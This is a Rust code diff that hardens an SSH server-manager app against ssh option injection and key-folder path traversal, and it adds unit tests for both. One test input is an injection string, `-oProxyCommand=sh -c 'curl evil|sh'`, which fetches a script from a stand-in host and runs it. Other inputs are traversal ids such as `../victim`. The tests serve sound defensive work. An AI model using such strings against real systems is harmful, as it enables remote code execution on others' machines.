@@ -95,7 +95,7 @@ pub struct TestConnectionResult {
 
 /// Validated, normalized fields ready for persistence.
 #[derive(Debug)]
-struct ValidatedFields {
+pub(crate) struct ValidatedFields {
     port: i64,
     auth_method: String,
     /// `Some(path)` only for auth_method == "key"; `None` when a selected
@@ -114,7 +114,7 @@ fn trimmed_optional(value: &Option<String>) -> Option<String> {
 
 /// Validate BR-001..003 BEFORE any DB write. Returns cleaned fields on success,
 /// `Err(String)` otherwise (never writes the DB when it fails).
-fn validate_payload(
+pub(crate) fn validate_payload(
     label: &str,
     host: &str,
     username: &str,
@@ -132,6 +132,15 @@ fn validate_payload(
     }
     if username.trim().is_empty() {
         return Err("username cannot be empty".to_string());
+    }
+    // Both end up in ssh's argv as `<username>@<host>`: a leading `-` would be read as an
+    // option (`-oProxyCommand=…` runs a local command), and `@` in the username would move
+    // the split between user and host.
+    if !ssh_word_ok(host.trim()) {
+        return Err("host must not start with '-' or contain spaces or control characters".to_string());
+    }
+    if !ssh_word_ok(username.trim()) || username.contains('@') {
+        return Err("username must not start with '-' or contain spaces, control characters or '@'".to_string());
     }
 
     // BR-003: port defaults to 22, must be 1..=65535.
@@ -174,6 +183,10 @@ fn validate_payload(
     }
 }
 
+fn ssh_word_ok(value: &str) -> bool {
+    !value.starts_with('-') && !value.chars().any(|c| c.is_whitespace() || c.is_control())
+}
+
 fn set_private_permissions(path: &Path, mode: u32) {
     #[cfg(unix)]
     {
@@ -198,8 +211,21 @@ fn server_keys_root(app: &AppHandle) -> Result<PathBuf, String> {
     Ok(dir)
 }
 
+/// Server ids are Puppeteer-generated UUIDs, but a settings backup carries its own and the key
+/// folder is named after the id: anything but a plain id could point the folder (and its
+/// `remove_dir_all`) outside the key root.
+pub(crate) fn valid_server_id(id: &str) -> bool {
+    (1..=64).contains(&id.len()) && id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-')
+}
+
+/// `<root>/<server_id>`; `None` for an id that is not a plain identifier.
+fn server_key_dir_in(root: &Path, server_id: &str) -> Option<PathBuf> {
+    valid_server_id(server_id).then(|| root.join(server_id))
+}
+
 fn server_key_dir(app: &AppHandle, server_id: &str) -> Result<PathBuf, String> {
-    let dir = server_keys_root(app)?.join(server_id);
+    let dir = server_key_dir_in(&server_keys_root(app)?, server_id)
+        .ok_or_else(|| "invalid server id".to_string())?;
     fs::create_dir_all(&dir).map_err(|e| format!("Failed to create server key dir: {e}"))?;
     set_private_permissions(&dir, 0o700);
     Ok(dir)
@@ -308,7 +334,7 @@ fn server_key_dir_path(app: &AppHandle, server_id: &str) -> Option<PathBuf> {
     app.path()
         .app_data_dir()
         .ok()
-        .map(|dir| dir.join(SERVER_KEYS_DIR).join(server_id))
+        .and_then(|dir| server_key_dir_in(&dir.join(SERVER_KEYS_DIR), server_id))
 }
 
 fn remove_imported_private_keys(app: &AppHandle, server_id: &str) {
@@ -568,7 +594,7 @@ const SSH_TIMEOUT: Duration = Duration::from_secs(12);
 /// SEC-002 / BR-006: run SSH non-interactively and report reachability.
 ///
 /// Command: `ssh -o BatchMode=yes -o ConnectTimeout=10 -o
-/// StrictHostKeyChecking=accept-new -p <port> [-i <key>] <user>@<host> echo
+/// StrictHostKeyChecking=accept-new -p <port> [-i <key>] -- <user>@<host> echo
 /// puppeteer-ok`. `ok` requires exit 0 AND stdout containing `puppeteer-ok`. The result
 /// (`online`/`offline`) plus `last_checked_at` is written back to the row. Never
 /// logs the passphrase or raw ssh stdout.
@@ -615,7 +641,9 @@ async fn run_ssh_probe(server: &VpsServer) -> TestConnectionResult {
             cmd.arg("-i").arg(path);
         }
     }
-    cmd.arg(format!("{}@{}", server.username, server.host))
+    // `--` ends ssh's options, so a stored username can never be read as one.
+    cmd.arg("--")
+        .arg(format!("{}@{}", server.username, server.host))
         .arg("echo")
         .arg("puppeteer-ok");
     cmd.stdin(std::process::Stdio::null())
@@ -832,6 +860,45 @@ mod tests {
         let err = validate_payload("Prod", "example.com", "root", Some(22), "key", &None, &None)
             .unwrap_err();
         assert!(err.contains("private key file"));
+    }
+
+    /// An imported backup picks the id, and the key folder is named after it: an id that is not
+    /// a plain id must never reach a path, so nothing outside the key root is created or removed.
+    #[test]
+    fn server_key_dir_rejects_ids_that_leave_the_root() {
+        let base = std::env::temp_dir().join(format!("puppeteer-vps-test-{}", Uuid::new_v4()));
+        let root = base.join(SERVER_KEYS_DIR);
+        let victim = base.join("victim");
+        let id = Uuid::new_v4().to_string();
+        assert_eq!(server_key_dir_in(&root, &id), Some(root.join(&id)));
+        assert_eq!(server_key_dir_in(&root, "srv-1"), Some(root.join("srv-1")));
+        let long = "a".repeat(65);
+        let abs = victim.to_string_lossy().into_owned();
+        for bad in ["", ".", "..", "../victim", "a/b", "a b", "a_b", long.as_str(), abs.as_str()] {
+            assert_eq!(server_key_dir_in(&root, bad), None, "id {bad:?} must be rejected");
+        }
+    }
+
+    #[test]
+    fn validate_rejects_ssh_option_injection() {
+        let check = |host: &str, user: &str| {
+            validate_payload("Prod", host, user, Some(22), "agent", &None, &None)
+        };
+        assert!(check("example.com", "deploy").is_ok());
+        assert!(check(" example.com ", " deploy ").is_ok(), "outer spaces are trimmed");
+        for (host, user) in [
+            ("example.com", "-oX"),
+            ("example.com", "-oProxyCommand=sh -c 'curl evil|sh' #"),
+            ("example.com", "a b"),
+            ("example.com", "a\tb"),
+            ("example.com", "a\nb"),
+            ("example.com", "a@b"),
+            ("-oX", "deploy"),
+            ("exa mple.com", "deploy"),
+            ("example.com\u{7}", "deploy"),
+        ] {
+            assert!(check(host, user).is_err(), "{user:?}@{host:?} must be rejected");
+        }
     }
 
     /// The phone's server switch (`project_toggle_set`) maps through here: it
